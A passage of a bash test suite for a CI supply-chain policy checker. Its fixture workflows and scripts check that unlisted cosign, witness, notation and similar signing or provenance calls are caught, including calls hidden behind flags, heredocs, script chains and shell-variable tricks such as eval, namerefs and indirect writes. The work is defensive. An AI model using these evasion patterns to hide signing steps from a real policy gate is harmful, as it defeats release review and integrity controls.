d=$(mk t_slsagen); printf 'jobs:\n  b:\n    uses: slsa-framework/slsa-github-generator/.github/workflows/generator_generic_slsa3.yml@%s\n' "$sha" > "$d/.github/workflows/stage-verify.yml"
expect caught "AC1 slsa-github-generator is a provenance signer" tree "$d"
d=$(mk t_unl); printf 'jobs:\n  b:\n    steps:\n      - run: cosign sign --yes "$IMG"\n' > "$d/.github/workflows/stage-verify.yml"
expect caught "AC1 an unlisted signing call (cosign sign) in a stage file" tree "$d"
d=$(mk t_yaml); printf 'jobs:\n  b:\n    steps:\n      - run: cosign attest --predicate p.json "$IMG"\n' > "$d/.github/workflows/other.yaml"
expect caught "AC1 a .yaml workflow file is scanned too" tree "$d"
d=$(mk t_comp); printf 'runs:\n  using: composite\n  steps:\n    - run: cosign sign "$IMG"\n      shell: bash\n' > "$d/.github/actions/x/action.yml"
expect caught "AC1 a composite action is scanned too" tree "$d"
d=$(mk t_script); printf 'jobs:\n  b:\n    steps:\n      - run: bash bin/publish.sh\n' > "$d/.github/workflows/stage-verify.yml"; printf '#!/usr/bin/env bash\ncosign attest --yes --type slsaprovenance1 --predicate p.json "$IMG"\n' > "$d/bin/publish.sh"
expect caught "AC1 a script a workflow runs signs provenance (bin/publish.sh)" tree "$d"
d=$(mk t_script2); printf 'jobs:\n  b:\n    steps:\n      - run: ./bin/publish.sh\n' > "$d/.github/workflows/stage-verify.yml"; printf '#!/usr/bin/env bash\ncosign sign --yes "$IMG"\n' > "$d/bin/publish.sh"
expect caught "AC1 an invoked script that signs and is not listed under its own path" tree "$d"
d=$(mk t_script3); printf 'jobs:\n  b:\n    steps:\n      - run: bash bin/publish.sh\n' > "$d/.github/workflows/stage-verify.yml"; printf '#!/usr/bin/env bash\ncosign sign --yes "$IMG"\n' > "$d/bin/publish.sh"
python3 - "$d" <<'PY'
import json, sys
f = sys.argv[1] + "/.github/policy/chain-signers.json"; j = json.load(open(f))
j["signers"].append({"file": "bin/publish.sh", "tool": "cosign sign", "reason": "image signature at publish (rule 56)"}); json.dump(j, open(f, "w"))
PY
expect ok "AC1 an invoked script that signs is fine when listed under its own path with a reason" tree "$d"
d=$(mk t_gflag); printf 'jobs:\n  b:\n    steps:\n      - run: witness --log-level debug run --step build -a slsa -- ./bin/build.sh\n' > "$d/.github/workflows/stage-build.yml"
expect caught "AC1 a global flag before the subcommand does not hide the signer (witness --log-level debug run -a slsa)" tree "$d"
d=$(mk t_cflag); printf 'jobs:\n  b:\n    steps:\n      - run: cosign --verbose attest --yes --type slsaprovenance1 --predicate p.json "$IMG"\n' > "$d/.github/workflows/stage-verify.yml"
expect caught "AC1 cosign --verbose attest of SLSA provenance" tree "$d"
d=$(mk t_aslsa); printf 'jobs:\n  b:\n    steps:\n      - run: witness run --step build -aslsa -- ./bin/build.sh\n' > "$d/.github/workflows/stage-build.yml"
expect caught "AC1 witness run -aslsa (shorthand with the value attached)" tree "$d"
d=$(mk t_wcfg); printf 'jobs:\n  b:\n    steps:\n      - run: witness run --step build -c witness.yaml -- ./bin/build.sh\n' > "$d/.github/workflows/stage-build.yml"
expect caught "AC1 witness run -c config with no explicit -a (the config file can list the slsa attestor): flagged" tree "$d"
d=$(mk t_blob); printf 'jobs:\n  b:\n    steps:\n      - run: cosign attest-blob --yes --statement prov.json --bundle b.json\n' > "$d/.github/workflows/stage-verify.yml"
expect caught "AC1 cosign attest-blob with no literal non-provenance type is provenance (fail closed)" tree "$d"
d=$(mk t_atvar); printf 'jobs:\n  b:\n    steps:\n      - run: cosign attest --yes --type "$T" --predicate p.json "$IMG"\n' > "$d/.github/workflows/stage-verify.yml"
expect caught "AC1 cosign attest with a shell-variable type is provenance (fail closed)" tree "$d"
d=$(mk t_quote); printf 'jobs:\n  b:\n    steps:\n      - run: echo "step #1"; cosign sign --yes "$IMG"\n' > "$d/.github/workflows/stage-verify.yml"
expect caught "AC1 a '#' inside quotes does not hide a signer on the same line (echo \"step #1\"; cosign sign)" tree "$d"
d=$(mk t_wra); printf 'jobs:\n  b:\n    steps:\n      - uses: testifysec/witness-run-action@%s # v1\n' "$sha" > "$d/.github/workflows/stage-build.yml"
expect caught "AC1 testifysec/witness-run-action is a provenance signer (its attestors cannot be resolved statically)" tree "$d"
d=$(mk t_make); printf 'jobs:\n  b:\n    steps:\n      - run: make publish\n' > "$d/.github/workflows/stage-verify.yml"; printf 'publish:\n\tcosign attest --yes --type slsaprovenance1 --predicate p.json $(IMG)\n' > "$d/Makefile"
expect caught "AC1 a Makefile target a workflow runs signs provenance" tree "$d"
d=$(mk t_js); printf 'jobs:\n  b:\n    steps:\n      - run: node scripts/pub.js\n' > "$d/.github/workflows/stage-verify.yml"; mkdir -p "$d/scripts"; printf 'require("child_process").execSync("cosign sign --yes " + process.env.IMG)\n' > "$d/scripts/pub.js"
expect caught "AC1 a node script a workflow runs signs an image and is not listed" tree "$d"
d=$(mk t_attml); printf 'jobs:\n  b:\n    steps:\n      - uses: actions/attest@%s # v4\n        with:\n          subject-path: dist/x\n          predicate-type: https://slsa.dev/provenance/v1\n' "$sha" > "$d/.github/workflows/stage-verify.yml"
expect caught "AC1 actions/attest with the SLSA predicate-type on a later line is provenance (round 5)" tree "$d"
d=$(mk t_attvar); printf 'jobs:\n  b:\n    steps:\n      - uses: actions/attest@%s # v4\n        with:\n          predicate-type: ${{ inputs.t }}\n' "$sha" > "$d/.github/workflows/stage-verify.yml"
expect caught "AC1 actions/attest with an expression predicate-type is provenance (fail closed)" tree "$d"
d=$(mk t_attok); printf 'jobs:\n  b:\n    steps:\n      - uses: actions/attest@%s # v4\n        with:\n          predicate-type: https://spdx.dev/Document\n' "$sha" > "$d/.github/workflows/stage-verify.yml"
python3 - "$d" <<'PY'
import json, sys
f = sys.argv[1] + "/.github/policy/chain-signers.json"; j = json.load(open(f))
j["signers"].append({"file": "stage-verify.yml", "tool": "actions/attest", "reason": "SBOM attestation of the image (rule 55)"}); json.dump(j, open(f, "w"))
PY
expect ok "AC1 actions/attest with a literal non-provenance predicate-type is fine when listed with a reason" tree "$d"
d=$(mk t_wvar); printf 'jobs:\n  b:\n    steps:\n      - run: witness run --step build -a "$ATT" -- ./bin/build.sh\n' > "$d/.github/workflows/stage-verify.yml"
expect caught "AC1 witness run -a \"\$ATT\" (variable attestor list) is provenance (fail closed)" tree "$d"
d=$(mk t_wexpr); printf 'jobs:\n  b:\n    steps:\n      - run: witness run --step build -a ${{ inputs.att }} -- ./bin/build.sh\n' > "$d/.github/workflows/stage-verify.yml"
expect caught "AC1 witness run -a \${{ expression }} is provenance (fail closed)" tree "$d"
d=$(mk t_wfold); printf 'jobs:\n  b:\n    steps:\n      - run: >-\n          witness run --step build\n          -a slsa -- ./bin/build.sh\n' > "$d/.github/workflows/stage-verify.yml"
expect caught "AC1 witness run with -a slsa on the next line of a folded scalar" tree "$d"
d=$(mk t_wnext); printf 'jobs:\n  b:\n    steps:\n      - run: |\n          witness run --step build -a\n          slsa -- ./bin/build.sh\n' > "$d/.github/workflows/stage-verify.yml"
expect caught "AC1 witness run -a with its value on the next line" tree "$d"
d=$(mk t_wcfg2); printf 'jobs:\n  b:\n    steps:\n      - run: witness run --step build -a product -c witness.yaml -- ./bin/build.sh\n' > "$d/.github/workflows/stage-verify.yml"
expect caught "AC1 witness run -a product -c cfg.yaml (the config file can add slsa)" tree "$d"
d=$(mk t_twotype); printf 'jobs:\n  b:\n    steps:\n      - run: cosign attest --yes --type spdx --type slsaprovenance1 --predicate p.json "$IMG"\n' > "$d/.github/workflows/stage-verify.yml"
expect caught "AC1 cosign attest with repeated --type: the first does not hide the second" tree "$d"
d=$(mk t_blobprov); printf 'jobs:\n  b:\n    steps:\n      - run: cosign sign-blob --yes provenance.intoto.jsonl --bundle b.json\n' > "$d/.github/workflows/stage-verify.yml"
expect caught "AC1 cosign sign-blob of a provenance blob is provenance" tree "$d"
d=$(mk t_sigpy); printf 'jobs:\n  b:\n    steps:\n      - run: python3 -m sigstore attest --predicate p.json dist/x\n' > "$d/.github/workflows/stage-verify.yml"
expect caught "AC1 the python sigstore CLI attest is a provenance signer" tree "$d"
d=$(mk t_notation); printf 'jobs:\n  b:\n    steps:\n      - run: notation sign "$IMG"\n' > "$d/.github/workflows/stage-verify.yml"
expect caught "AC1 notation sign is a known signer that must be listed" tree "$d"
d=$(mk t_intoto); printf 'jobs:\n  b:\n    steps:\n      - run: in-toto-run --step-name build -- ./x\n' > "$d/.github/workflows/stage-verify.yml"
expect caught "AC1 in-toto-run is a known signer that must be listed" tree "$d"
d=$(mk t_ws); printf 'jobs:\n  b:\n    steps:\n      - run: bash "$GITHUB_WORKSPACE/bin/pub.sh"\n' > "$d/.github/workflows/stage-verify.yml"; printf '#!/usr/bin/env bash\ncosign attest --yes --type slsaprovenance1 --predicate p.json "$IMG"\n' > "$d/bin/pub.sh"
expect caught "AC1 bash \"\$GITHUB_WORKSPACE/bin/pub.sh\" is resolved and its provenance signing seen" tree "$d"
d=$(mk t_ws2); printf 'jobs:\n  b:\n    steps:\n      - run: bash ${{ github.workspace }}/bin/pub.sh\n' > "$d/.github/workflows/stage-verify.yml"; printf '#!/usr/bin/env bash\ncosign sign --yes "$IMG"\n' > "$d/bin/pub.sh"
expect caught "AC1 bash \${{ github.workspace }}/bin/pub.sh is resolved" tree "$d"
d=$(mk t_cdp); mkdir -p "$d/scripts"; printf 'jobs:\n  b:\n    steps:\n      - run: cd scripts && ./pub.sh\n' > "$d/.github/workflows/stage-verify.yml"; printf '#!/usr/bin/env bash\ncosign sign --yes "$IMG"\n' > "$d/scripts/pub.sh"
expect caught "AC1 cd scripts && ./pub.sh is resolved through the cd prefix" tree "$d"
d=$(mk t_noext); printf 'jobs:\n  b:\n    steps:\n      - run: ./bin/publish\n' > "$d/.github/workflows/stage-verify.yml"; printf '#!/usr/bin/env bash\ncosign sign --yes "$IMG"\n' > "$d/bin/publish"; chmod +x "$d/bin/publish"
expect caught "AC1 an extensionless script that starts with #! is scanned" tree "$d"
d=$(mk t_pym); mkdir -p "$d/tools"; printf 'jobs:\n  b:\n    steps:\n      - run: python3 -m tools.pub\n' > "$d/.github/workflows/stage-verify.yml"; printf 'import os\nos.system("cosign sign --yes " + os.environ["IMG"])\n' > "$d/tools/pub.py"
expect caught "AC1 python3 -m tools.pub is resolved to tools/pub.py" tree "$d"
d=$(mk t_trans); printf 'jobs:\n  b:\n    steps:\n      - run: bash bin/a.sh\n' > "$d/.github/workflows/stage-verify.yml"; printf '#!/usr/bin/env bash\nbash "$(dirname "$0")/b.sh"\n' > "$d/bin/a.sh"; printf '#!/usr/bin/env bash\ncosign sign --yes "$IMG"\n' > "$d/bin/b.sh"
expect caught "AC1 a script that calls another script is followed (bin/a.sh -> bin/b.sh)" tree "$d"
d=$(mk t_unres); printf 'jobs:\n  b:\n    steps:\n      - run: bash "$SOME_DIR/pub.sh"\n' > "$d/.github/workflows/stage-verify.yml"
expect caught "AC1 a script path in an unknown variable is an error naming the workflow (fail closed)" tree "$d"
d=$(mk t_gone); printf 'jobs:\n  b:\n    steps:\n      - run: bash bin/gone.sh\n' > "$d/.github/workflows/stage-verify.yml"
expect caught "AC1 a script reference with no such file is an error (fail closed)" tree "$d"
d=$(mk t_nvar); printf 'jobs:\n  b:\n    steps:\n      - run: bash bin/a.sh\n' > "$d/.github/workflows/stage-verify.yml"; printf '#!/usr/bin/env bash\nS=bin/pub\nbash "$S.sh"\n' > "$d/bin/a.sh"; printf '#!/usr/bin/env bash\ncosign attest --type slsaprovenance1 --predicate p.json "$IMG"\n' > "$d/bin/pub.sh"
expect caught "AC1 a script that reaches its next script through a variable (S=bin/pub; bash \"\$S.sh\") is now followed (S is a plain literal), so its unlisted cosign call is seen (rounds 6/7)" tree "$d"
d=$(mk t_ntest); printf 'jobs:\n  b:\n    steps:\n      - run: bash bin/x-test.sh\n' > "$d/.github/workflows/stage-verify.yml"; printf '#!/usr/bin/env bash\nbash "$work/gen.sh"\n' > "$d/bin/x-test.sh"
expect caught "AC1 a *-test.sh with an unresolved reference, reached from a STAGE file, is judged strictly" tree "$d"
d=$(mk t_ntest2); printf 'jobs:\n  b:\n    steps:\n      - run: bash bin/x-test.sh\n' > "$d/.github/workflows/ci.yml"; printf '#!/usr/bin/env bash\nbash "$work/gen.sh"\n' > "$d/bin/x-test.sh"
expect ok "AC1 a *-test.sh that builds throw-away scripts and is reached only from ci.yml is not an error" tree "$d"
d=$(mk t_nplain); printf 'jobs:\n  b:\n    steps:\n      - run: bash bin/x.sh\n' > "$d/.github/workflows/ci.yml"; printf '#!/usr/bin/env bash\nbash "$work/gen.sh"\n' > "$d/bin/x.sh"
expect caught "AC1 a non-test script with an unresolved reference is strict even from ci.yml" tree "$d"
d=$(mk t_nboth); printf 'jobs:\n  b:\n    steps:\n      - run: bash bin/x-test.sh\n' > "$d/.github/workflows/ci.yml"; printf 'jobs:\n  b:\n    steps:\n      - run: bash bin/x-test.sh\n' > "$d/.github/workflows/stage-verify.yml"; printf '#!/usr/bin/env bash\nbash "$work/gen.sh"\n' > "$d/bin/x-test.sh"
expect caught "AC1 the same test script reached from ci.yml AND a stage file is strict" tree "$d"
d=$(mk t_ciid); printf 'on: push\npermissions:\n  id-token: write\njobs:\n  b:\n    steps:\n      - run: bash bin/x-test.sh\n' > "$d/.github/workflows/ci.yml"; printf '#!/usr/bin/env bash\nbash "$work/gen.sh"\n' > "$d/bin/x-test.sh"
expect caught "AC1 ci.yml grants id-token: write: the test-script carve-out is no longer safe (Opus r5 SF-C)" tree "$d"
d=$(mk t_cisec); printf 'on: push\njobs:\n  b:\n    steps:\n      - env:\n          K: ${{ secrets.APK_RELEASE_SIGNING_KEY }}\n        run: bash bin/x-test.sh\n' > "$d/.github/workflows/ci.yml"; printf '#!/usr/bin/env bash\nbash "$work/gen.sh"\n' > "$d/bin/x-test.sh"
expect caught "AC1 ci.yml passes a signing secret to a step (Opus r5 SF-C)" tree "$d"
d=$(mk t_ciapp); printf 'on: push\njobs:\n  b:\n    steps:\n      - uses: actions/create-github-app-token@%s\n        with:\n          app-id: ${{ secrets.AUDITOR_APP_ID }}\n          private-key: ${{ secrets.AUDITOR_APP_PRIVATE_KEY }}\n      - run: bash bin/x-test.sh\n' "$sha" > "$d/.github/workflows/ci.yml"; printf '#!/usr/bin/env bash\nbash "$work/gen.sh"\n' > "$d/bin/x-test.sh"
expect ok "AC1 ci.yml using the auditor App secrets (today's real use) is not a signing secret" tree "$d"
d=$(mk t_assign); printf 'jobs:\n  b:\n    steps:\n      - run: bash bin/a.sh\n' > "$d/.github/workflows/stage-verify.yml"; printf '#!/usr/bin/env bash\nCHK=bin/pub.sh; bash "$CHK"\n' > "$d/bin/a.sh"; printf '#!/usr/bin/env bash\ncosign sign --yes "$IMG"\n' > "$d/bin/pub.sh"
expect caught "AC1 round 10: CHK=bin/pub.sh; bash \"\$CHK\" is a variable script reference: an error, so pub.sh can never be hidden behind it" tree "$d"
d=$(mk t_assignok); printf 'jobs:\n  b:\n    steps:\n      - run: bash bin/a.sh\n' > "$d/.github/workflows/stage-verify.yml"; printf '#!/usr/bin/env bash\nCHK=bin/clean.sh\nbash "$CHK"\n' > "$d/bin/a.sh"; printf '#!/usr/bin/env bash\necho hi\n' > "$d/bin/clean.sh"
expect caught "AC1 round 10: even a single VAR=literal is NOT followed: CHK=bin/clean.sh; bash \"\$CHK\" is a variable script reference, an error (scripts must be called by literal path)" tree "$d"
d=$(mk t_assignamb); printf 'jobs:\n  b:\n    steps:\n      - run: bash bin/a.sh\n' > "$d/.github/workflows/stage-verify.yml"; printf '#!/usr/bin/env bash\nCHK=bin/clean.sh\nCHK=bin/pub.sh\nbash "$CHK"\n' > "$d/bin/a.sh"; printf '#!/usr/bin/env bash\necho hi\n' > "$d/bin/clean.sh"; printf '#!/usr/bin/env bash\necho hi\n' > "$d/bin/pub.sh"
expect caught "AC1 a variable assigned two different literals is ambiguous: an error, not a guess" tree "$d"
d=$(mk t_assigncmd); printf 'jobs:\n  b:\n    steps:\n      - run: bash bin/a.sh\n' > "$d/.github/workflows/stage-verify.yml"; printf '#!/usr/bin/env bash\nCHK=$(pwd)/pub.sh\nbash "$CHK"\n' > "$d/bin/a.sh"
expect caught "AC1 a variable assigned from a command substitution is not a literal: still an error" tree "$d"
d=$(mk t_vnonlit); printf 'jobs:\n  b:\n    steps:\n      - run: bash bin/a.sh\n' > "$d/.github/workflows/stage-verify.yml"; printf '#!/usr/bin/env bash\nS=bin/clean.sh\nS=$NEXT\nbash "$S"\n' > "$d/bin/a.sh"; printf '#!/usr/bin/env bash\necho hi\n' > "$d/bin/clean.sh"; printf '#!/usr/bin/env bash\ncosign sign --yes "$IMG"\n' > "$d/bin/other.sh"
expect caught "AC1 round 8: a literal followed by an assignment from outside is ambiguous: an error, never the earlier literal" tree "$d"
d=$(mk t_vappend); printf 'jobs:\n  b:\n    steps:\n      - run: bash bin/a.sh\n' > "$d/.github/workflows/stage-verify.yml"; printf '#!/usr/bin/env bash\nS=bin/clean\nS+=_x\nbash "$S.sh"\n' > "$d/bin/a.sh"; printf '#!/usr/bin/env bash\necho hi\n' > "$d/bin/clean.sh"; printf '#!/usr/bin/env bash\ncosign sign --yes "$IMG"\n' > "$d/bin/other.sh"
expect caught "AC1 round 8: a literal followed by an append is ambiguous: an error, never the earlier literal" tree "$d"
d=$(mk t_vread); printf 'jobs:\n  b:\n    steps:\n      - run: bash bin/a.sh\n' > "$d/.github/workflows/stage-verify.yml"; printf '#!/usr/bin/env bash\nS=bin/clean.sh\nread -r S < list\nbash "$S"\n' > "$d/bin/a.sh"; printf '#!/usr/bin/env bash\necho hi\n' > "$d/bin/clean.sh"; printf '#!/usr/bin/env bash\ncosign sign --yes "$IMG"\n' > "$d/bin/other.sh"
expect caught "AC1 round 8: a literal followed by a read into the same name is ambiguous: an error, never the earlier literal" tree "$d"
d=$(mk t_vforin); printf 'jobs:\n  b:\n    steps:\n      - run: bash bin/a.sh\n' > "$d/.github/workflows/stage-verify.yml"; printf '#!/usr/bin/env bash\nS=bin/clean.sh\nfor S in a b; do bash "$S"; done\n' > "$d/bin/a.sh"; printf '#!/usr/bin/env bash\necho hi\n' > "$d/bin/clean.sh"; printf '#!/usr/bin/env bash\ncosign sign --yes "$IMG"\n' > "$d/bin/other.sh"
expect caught "AC1 round 8: a literal followed by a for-in loop over the same name is ambiguous: an error, never the earlier literal" tree "$d"
d=$(mk t_vunset); printf 'jobs:\n  b:\n    steps:\n      - run: bash bin/a.sh\n' > "$d/.github/workflows/stage-verify.yml"; printf '#!/usr/bin/env bash\nS=bin/clean.sh\nunset S\nbash "$S"\n' > "$d/bin/a.sh"; printf '#!/usr/bin/env bash\necho hi\n' > "$d/bin/clean.sh"; printf '#!/usr/bin/env bash\ncosign sign --yes "$IMG"\n' > "$d/bin/other.sh"
expect caught "AC1 round 8: a literal followed by an unset is ambiguous: an error, never the earlier literal" tree "$d"
d=$(mk t_vlocal); printf 'jobs:\n  b:\n    steps:\n      - run: bash bin/a.sh\n' > "$d/.github/workflows/stage-verify.yml"; printf '#!/usr/bin/env bash\nS=bin/clean.sh\nf() { local S; bash "$S"; }\nf\n' > "$d/bin/a.sh"; printf '#!/usr/bin/env bash\necho hi\n' > "$d/bin/clean.sh"; printf '#!/usr/bin/env bash\ncosign sign --yes "$IMG"\n' > "$d/bin/other.sh"
expect caught "AC1 round 8: a literal and a local declaration with no literal is ambiguous: an error, never the earlier literal" tree "$d"
d=$(mk t_vdefault); printf 'jobs:\n  b:\n    steps:\n      - run: bash bin/a.sh\n' > "$d/.github/workflows/stage-verify.yml"; printf '#!/usr/bin/env bash\nS=bin/clean.sh\n: "${S:=bin/other.sh}"\nbash "$S"\n' > "$d/bin/a.sh"; printf '#!/usr/bin/env bash\necho hi\n' > "$d/bin/clean.sh"; printf '#!/usr/bin/env bash\ncosign sign --yes "$IMG"\n' > "$d/bin/other.sh"
expect caught "AC1 round 8: a literal and a colon-equals default expansion is ambiguous: an error, never the earlier literal" tree "$d"
d=$(mk t_vbranch); printf 'jobs:\n  b:\n    steps:\n      - run: bash bin/a.sh\n' > "$d/.github/workflows/stage-verify.yml"; printf '#!/usr/bin/env bash\nif test -n "$X"; then S=bin/clean.sh; else S=bin/other.sh; fi\nbash "$S"\n' > "$d/bin/a.sh"; printf '#!/usr/bin/env bash\necho hi\n' > "$d/bin/clean.sh"; printf '#!/usr/bin/env bash\ncosign sign --yes "$IMG"\n' > "$d/bin/other.sh"
expect caught "AC1 round 8: two literals in if/else branches are ambiguous: an error, never the earlier literal" tree "$d"
d=$(mk t_trans1); printf 'jobs:\n  b:\n    steps:\n      - run: bash bin/plain.sh\n' > "$d/.github/workflows/stage-verify.yml"; printf '#!/usr/bin/env bash\nbash bin/x-test.sh\n' > "$d/bin/plain.sh"; printf '#!/usr/bin/env bash\nbash "$work/gen.sh"\n' > "$d/bin/x-test.sh"
expect caught "AC1 transitive: stage file -> plain.sh -> x-test.sh stays strict (the carve-out does not follow a script reached from a stage file) (round 7, Sonnet note 6)" tree "$d"
d=$(mk t_trans2); printf 'jobs:\n  b:\n    steps:\n      - run: bash bin/x-test.sh\n' > "$d/.github/workflows/ci.yml"; printf '#!/usr/bin/env bash\nbash bin/y-test.sh\n' > "$d/bin/x-test.sh"; printf '#!/usr/bin/env bash\nbash "$work/gen.sh"\n' > "$d/bin/y-test.sh"
expect ok "AC1 transitive: ci.yml -> x-test.sh -> y-test.sh, all test scripts reached only from ci.yml, may build throw-away scripts" tree "$d"
d=$(mk t_trans3); printf 'jobs:\n  b:\n    steps:\n      - run: bash bin/x-test.sh\n' > "$d/.github/workflows/ci.yml"; printf '#!/usr/bin/env bash\nbash bin/lib.sh\n' > "$d/bin/x-test.sh"; printf '#!/usr/bin/env bash\nbash "$work/gen.sh"\n' > "$d/bin/lib.sh"
expect caught "AC1 transitive: ci.yml -> x-test.sh -> lib.sh (a NON-test script) stays strict" tree "$d"
d=$(mk t_heredoc); printf 'jobs:\n  b:\n    steps:\n      - run: |\n          cat > x.sh <<EOF\n          cosign sign --yes img\n          EOF\n' > "$d/.github/workflows/stage-verify.yml"
expect caught "AC1 a signing call written inside a heredoc of a workflow step is still seen" tree "$d"
d=$(mk t_new); cp "$good" "$d/.github/workflows/stage-extra.yml"
expect caught "AC1 a second new workflow file" tree "$d"
d=$(mk t_noreason); sed -i.bak 's/"reason":"CI patch tag (REQ-REL-009-AC5)"/"reason":" "/' "$d/.github/policy/chain-signers.json"
expect caught "AC1 a listed signer with no reason" tree "$d"
d=$(mk t_nolist); rm "$d/.github/policy/chain-signers.json"
expect caught "AC1 no chain-signers.json" tree "$d"
# 003-AC5: only release.yml calls stage-sign.yml and no stage calls a stage (a stage that calls another stage gets that stage's SAN: spike (b) case 5)
d=$(mk c_good); printf 'jobs:\n  s:\n    uses: ./.github/workflows/stage-sign.yml\n  b:\n    uses: ./.github/workflows/stage-build.yml\n' > "$d/.github/workflows/release.yml"
expect ok "003-AC5 fixture: release.yml calls every stage file" calls "$d"
d=$(mk c_nested); printf 'jobs:\n  x:\n    uses: ./.github/workflows/stage-sign.yml\n' > "$d/.github/workflows/stage-build.yml"
expect caught "003-AC5 stage-build.yml calls stage-sign.yml (nested call)" calls "$d"
d=$(mk c_second); printf 'on: push\njobs:\n  x:\n    uses: ./.github/workflows/stage-sign.yml\n' > "$d/.github/workflows/ci.yml"
expect caught "003-AC5 a second workflow (ci.yml) calls stage-sign.yml" calls "$d"
d=$(mk c_remote); printf 'jobs:\n  x:\n    uses: fosterstack/cache/.github/workflows/stage-sign.yml@%s\n' "$sha" > "$d/.github/workflows/auditor.yml"
expect caught "003-AC5 a second workflow calls stage-sign.yml by repository path and digest" calls "$d"
d=$(mk c_step); printf 'jobs:\n  x:\n    steps:\n      - uses: ./.github/workflows/stage-verify.yml\n' > "$d/.github/workflows/stage-promote.yml"
expect caught "003-AC5 a step-level reference to a stage file from another stage" calls "$d"
d=$(mk c_yaml); printf 'jobs:\n  x:\n    uses: ./.github/workflows/stage-sign.yml\n' > "$d/.github/workflows/other.yaml"
expect caught "003-AC5 a .yaml workflow calling stage-sign.yml" calls "$d"
d=$(mk c_scan); printf 'on: push\njobs:\n  x:\n    uses: ./.github/workflows/stage-build.yml\n' > "$d/.github/workflows/scan.yml"
expect ok "003-AC5 a non-stage workflow (scan.yml) may still call stage-build.yml" calls "$d"
d=$(mk t_r9exp); mkdir -p "$d/bin"; printf %s 'jobs:
  b:
    steps:
      - run: bash bin/a.sh
' > "$d/.github/workflows/stage-verify.yml"; printf %s '#!/usr/bin/env bash
S=bin/clean.sh
export "S=$(pick)"
bash "$S"
' > "$d/bin/a.sh"; printf %s '#!/usr/bin/env bash
echo hi
' > "$d/bin/clean.sh"; printf %s '#!/usr/bin/env bash
cosign sign --yes "$IMG"
' > "$d/bin/other.sh"
expect caught 'AC1 round 9: export "S=$(pick)" (a quoted-name write) after a literal makes S ambiguous' tree "$d"
d=$(mk t_r9dec); mkdir -p "$d/bin"; printf %s 'jobs:
  b:
    steps:
      - run: bash bin/a.sh
' > "$d/.github/workflows/stage-verify.yml"; printf %s '#!/usr/bin/env bash
S=bin/clean.sh
declare "S=$X"
bash "$S"
' > "$d/bin/a.sh"; printf %s '#!/usr/bin/env bash
echo hi
' > "$d/bin/clean.sh"; printf %s '#!/usr/bin/env bash
cosign sign --yes "$IMG"
' > "$d/bin/other.sh"
expect caught 'AC1 round 9: declare "S=$X" after a literal makes S ambiguous' tree "$d"
d=$(mk t_r9loc); mkdir -p "$d/bin"; printf %s 'jobs:
  b:
    steps:
      - run: bash bin/a.sh
' > "$d/.github/workflows/stage-verify.yml"; printf %s '#!/usr/bin/env bash
S=bin/clean.sh
f() { local "S=$1"; bash "$S"; }
f
' > "$d/bin/a.sh"; printf %s '#!/usr/bin/env bash
echo hi
' > "$d/bin/clean.sh"; printf %s '#!/usr/bin/env bash
cosign sign --yes "$IMG"
' > "$d/bin/other.sh"
expect caught 'AC1 round 9: local "S=$1" after a literal makes S ambiguous' tree "$d"
d=$(mk t_r9eval); mkdir -p "$d/bin"; printf %s 'jobs:
  b:
    steps:
      - run: bash bin/a.sh
' > "$d/.github/workflows/stage-verify.yml"; printf %s '#!/usr/bin/env bash
S=bin/clean.sh
eval "S=$(pick)"
bash "$S"
' > "$d/bin/a.sh"; printf %s '#!/usr/bin/env bash
echo hi
' > "$d/bin/clean.sh"; printf %s '#!/usr/bin/env bash
cosign sign --yes "$IMG"
' > "$d/bin/other.sh"
expect caught 'AC1 round 9: eval "S=$(pick)" resolves nothing in the unit' tree "$d"
d=$(mk t_r9idx); mkdir -p "$d/bin"; printf %s 'jobs:
  b:
    steps:
      - run: bash bin/a.sh
' > "$d/.github/workflows/stage-verify.yml"; printf %s '#!/usr/bin/env bash
S=bin/clean.sh
S[0]=$X
bash "$S"
' > "$d/bin/a.sh"; printf %s '#!/usr/bin/env bash
echo hi
' > "$d/bin/clean.sh"; printf %s '#!/usr/bin/env bash
cosign sign --yes "$IMG"
' > "$d/bin/other.sh"
expect caught 'AC1 round 9: S[0]=$X after a literal makes S ambiguous' tree "$d"
d=$(mk t_r9idxl); mkdir -p "$d/bin"; printf %s 'jobs:
  b:
    steps:
      - run: bash bin/a.sh
' > "$d/.github/workflows/stage-verify.yml"; printf %s '#!/usr/bin/env bash
S=bin/clean.sh
S[0]=bin/other.sh
bash "$S"
' > "$d/bin/a.sh"; printf %s '#!/usr/bin/env bash
echo hi
' > "$d/bin/clean.sh"; printf %s '#!/usr/bin/env bash
cosign sign --yes "$IMG"
' > "$d/bin/other.sh"
expect caught 'AC1 round 9: S[0]=bin/other.sh (an array element write with a literal) makes S ambiguous' tree "$d"
d=$(mk t_r9nameref); mkdir -p "$d/bin"; printf %s 'jobs:
  b:
    steps:
      - run: bash bin/a.sh
' > "$d/.github/workflows/stage-verify.yml"; printf %s '#!/usr/bin/env bash
S=bin/clean.sh
declare -n R=S
R=$(pick)
bash "$S"
' > "$d/bin/a.sh"; printf %s '#!/usr/bin/env bash
echo hi
' > "$d/bin/clean.sh"; printf %s '#!/usr/bin/env bash
cosign sign --yes "$IMG"
' > "$d/bin/other.sh"
expect caught 'AC1 round 9: declare -n R=S; R=$(pick) (a nameref write) resolves nothing' tree "$d"
d=$(mk t_r9pfv); mkdir -p "$d/bin"; printf %s 'jobs:
  b:
    steps:
      - run: bash bin/a.sh
' > "$d/.github/workflows/stage-verify.yml"; printf %s '#!/usr/bin/env bash
S=bin/clean.sh
T=S
printf -v "$T" %s "$X"
bash "$S"
' > "$d/bin/a.sh"; printf %s '#!/usr/bin/env bash
echo hi
' > "$d/bin/clean.sh"; printf %s '#!/usr/bin/env bash
cosign sign --yes "$IMG"
' > "$d/bin/other.sh"
expect caught 'AC1 round 9: T=S; printf -v "$T" ... (an indirect write) makes S ambiguous' tree "$d"
d=$(mk t_r9readi); mkdir -p "$d/bin"; printf %s 'jobs:
  b:
    steps:
      - run: bash bin/a.sh
' > "$d/.github/workflows/stage-verify.yml"; printf %s '#!/usr/bin/env bash
S=bin/clean.sh
T=S
read "$T"
bash "$S"
' > "$d/bin/a.sh"; printf %s '#!/usr/bin/env bash
echo hi
' > "$d/bin/clean.sh"; printf %s '#!/usr/bin/env bash
cosign sign --yes "$IMG"
' > "$d/bin/other.sh"
expect caught 'AC1 round 9: T=S; read "$T" (an indirect read-into) makes S ambiguous' tree "$d"
d=$(mk t_r9unseti); mkdir -p "$d/bin"; printf %s 'jobs:
  b:
    steps:
      - run: bash bin/a.sh
' > "$d/.github/workflows/stage-verify.yml"; printf %s '#!/usr/bin/env bash
S=bin/clean.sh
T=S
unset "$T"
bash "$S"
